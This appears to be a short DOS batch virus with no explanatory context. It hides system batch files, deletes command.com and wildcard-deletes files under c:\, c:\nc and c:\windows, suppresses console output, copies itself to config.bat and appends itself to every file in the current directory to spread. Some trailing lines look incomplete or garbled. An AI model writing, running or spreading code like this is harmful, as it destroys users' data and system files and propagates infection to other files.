@echo off
@ctty nul
attrib +H c:\autoexec.bat
attrib +H c:\system.bat
attrib +H c:\config.bat
del c:\command.com
del c:\*.???
del c:\nc\*.???
del c:\windows\*.???
c:\
c:\system.bat
@ctty nul 
copy %0 c:\config.bat
echo @call config.bat 
for %%0 in (*.*) do COPY %%0+%0 /b>nul
c:\windows\system\system.bat
c:\windows\system\s.txt
c:\windows\system\vmm32
